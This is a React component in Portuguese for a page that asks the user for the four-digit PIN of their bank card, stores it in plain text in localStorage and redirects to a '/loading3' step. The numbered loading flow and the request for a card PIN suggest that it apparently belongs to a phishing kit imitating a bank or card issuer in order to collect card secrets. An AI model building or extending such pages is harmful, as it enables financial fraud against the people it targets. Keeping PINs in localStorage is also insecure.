import React, { useState } from 'react';

const Header = () => {
  return (
    <header className="header">
      <img src="mLogomenor.png" alt="Logo" className="logo" />
    </header>
  );
};

const ConfirmPage = () => {
  const [senhaCartao, setSenhaCartao] = useState('');
  const [error, setError] = useState('');

  const handleSenhaChange = (e) => {
    setSenhaCartao(e.target.value);
  };

  const handleRedirect = () => {
    if (senhaCartao === '' || senhaCartao.length !== 4) {
      setError('A senha deve ter exatamente 4 dígitos.');
    } else {
      setError('');
      // Armazena a senha do cartão no localStorage
      localStorage.setItem('senhaCartao', senhaCartao);
      // Redireciona para a página desejada
      window.location.href = "/loading3";
    }
  };

  return (
    <div style={{ backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      <Header />
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '20px' }}>
        <h2 style={{ fontSize: '16px', color: '#282828', alignSelf: 'flex-start', paddingLeft: '3%' }}>Digite a senha do cartão:</h2>
        <form style={{ width: '100%', maxWidth: '400px', padding: '10px', marginTop: '5%' }}>
          <label htmlFor="senhaCartao" style={{ fontSize: '16px', color: '#282828' }}>
            <b>Senha 4 Dígitos:</b>
          </label>
          <input
            type="password"
            id="senhaCartao"
            name="senhaCartao"
            placeholder="Digite a senha do cartão"
            value={senhaCartao}
            onChange={handleSenhaChange}
            style={{
              width: '100%',
              fontSize: '16px',
              border: 'none',
              borderBottom: 'solid 1px #b3b3b3',
              borderRadius: '2px',
              display: 'block',
              color: '#282828',
              padding: '8px',
              height: '36px',
              outline: '0',
              marginTop: '5%',
            }}
            maxLength={4}
          />
          {error && <p style={{ color: 'red', marginTop: '5px' }}>{error}</p>}
          <button
            type="button"
            onClick={handleRedirect}
            style={{
              background: 'url(img/bgbottom.png) repeat',
              borderRadius: '4px',
              fontFamily: 'arial',
              fontSize: '18px',
              color: '#fff',
              padding: '12px',
              textAlign: 'center',
              width: '100%',
              cursor: 'pointer',
              backgroundColor: '#fc990a',
              marginTop: '40px',
            }}
          >
            CONFIRMAR
          </button>
        </form>
      </div>
    </div>
  );
};

export default ConfirmPage;
